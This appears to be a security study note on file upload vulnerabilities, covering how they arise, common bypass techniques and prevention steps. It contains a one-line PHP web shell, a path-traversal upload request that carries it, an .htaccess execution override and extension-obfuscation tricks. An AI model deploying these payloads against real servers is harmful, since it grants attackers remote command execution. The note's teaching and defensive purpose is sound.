# File upload vulnerabilities

## What are file upload vulnerabilities?
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

## How web servers handle file requests
Web servers typically handle responses for resources as follows:

- `Non-executable files`: the file is served back to the user (e.g. `.png`).
- `Executable file`: the file is processed by the web server and the result is sent back to the user (e.g. `.php` or `.jsp`).
- `Executable file but server not configured to execute`: this will either trigger an error or send the content of the file back to the user, which can result in source code leakage.

:bulb: use the `Content-Type` header's MIME type to determine what type of file the server thinks it has sent you.

## What is the impact of file upload vulnerabilities?

The impact of file upload vulnerabilities generally depends on two key factors:
- Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.
- What restrictions are imposed on the file once it has been successfully uploaded.

In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as .php and .jsp) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server.

## How do file upload vulnerabilities arise?
Given the fairly obvious dangers, it's rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.

There are several types of attackes:

- `Content not validated`: allow an attacker to execute arbitrary script or code on the server.
- `File name/location not validated`: allow an attacker to overwrite existing files or upload files to a location they should not have access to.
- `Size not validated`: use file upload to consume memory and disk space (DoS).

## Attacks

### Deploying a web shell

A web shell is when an attacker can upload a file that allows them to execute any command on a web server:

```php
# execute arbitrary commands
# GET /example/exploit.php?command=echo%20%2Fetc%2Fpasswd HTTP/1.1
<?php echo system($_GET['command']); ?>
```

### Exploit file upload validation

#### Flawed file type validation

Uploads using `multipart/form-data` will send a request like the following:

```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

Some image description right here

---------------------------012345678901234567890123456--
```

If the server trusts the `Content-Type: image/jpeg` value in the request and performs no further validation, it easy to upload a malicious file.

#### Bypass strict execution control in user-controlled directories

Server will usually be configured to prevent execution of any files in user upload directories.  It may be possible to cause the file to be uploaded to a new, unexpected location by altering the `filename` parameter in the upload request:

```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="../../exploit.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>

```

#### Insufficient block of malicious filetypes

Servers may be configured to prevent execution of `.php` files, but may not block lesser known dynamic file types like `.php5` or `.shtml`.

##### Overriding server configuration

It may be possible to upload a file that changes the configuration for a given directory, thereby allowing execution of the malcious file:

```sh
# .htaccess granting execution of .php files in an a user controlled upload directory
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

#### Obfuscation of file extension

Cause the server to execute a file with a different extension:

- Altered case: `malicious.pHp`
- Double file extenstion: `malicious.php.jpg`
- URL encoded file extension: `malicious%2Ephp`
- Null byte or semicolon to terminate: `malicious.php%00.jpg` or `malicious.php;.jpg`
- Unicode encoding: `malicious%u002ephp`
- Buried file extension, which will be stripped by the server: `malicious.p.phphp`

#### Flawed validation of file contents

Servers may try to determine file contents by checking properties of the files:

- Image file dimensions; or
- Expected byte sequences in the file.

However, these can be faked with something like [ExifTool](https://exiftool.org/).

#### Upload race conditions

Relies on the attacker uploading and attempting to execute the malicious file before the file server can scan and determine the file is malicious.

This can also be perfomed by file upload that accepts a file URL.  The attacker can attempt to lengthen the amount of time they have for an attack by putting the attack payload at the beginning of the file and then padding the upload with arbitrary data.

### Exploits without server-side execution

- `XSS`: upload a file that is consumed by other users (e.g. profile picture) and attacks the other user's account.
- `XXE`: if the file accepts XML based uploads, you can attempt attackes through files like `.doc` or `.xls` files.

### Upload via PUT

Some servers will accept file uploads through `PUT` requests that are not as rigorously validated as `POST` requests.  

:bulb: You can use an `OPTIONS` request to check if `PUT` is supported.

## Prevent

- Validate the file type, size, and content.
- Use an established file upload framework.
- Randomise the file name and location.
- Do not allow directory traversal characters `../` in the filename.
- Only move files to the server's permanent file system once they have been validated.
- Determine the safe max file size that can be uploaded.
- Deny execution of all files by default and then safe-list specific file types that can be executed.
- IP rate limit on file uploads to prevent DoS.
